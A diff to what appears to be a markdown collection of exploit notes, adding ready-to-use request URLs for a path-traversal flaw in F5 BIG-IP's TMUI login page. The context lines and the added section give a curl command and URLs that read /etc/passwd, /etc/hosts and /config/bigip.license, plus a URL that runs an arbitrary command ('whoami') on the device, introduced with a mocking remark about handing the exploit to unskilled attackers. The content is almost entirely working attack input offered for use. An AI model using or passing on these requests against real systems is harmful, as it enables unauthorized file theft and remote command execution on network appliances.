@@ -85,3 +85,19 @@ First RCE:
 then arbitrary read File: 
 
 ````curl -v -k  'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'````
+
+### not to be outdone @wugeej rams the exploit in the skids hands
+LFI
+
+````
+https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
+or /etc/hosts
+or /config/bigip.license
+````
+
+RCE
+
+````
+https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=whoami
+````
+
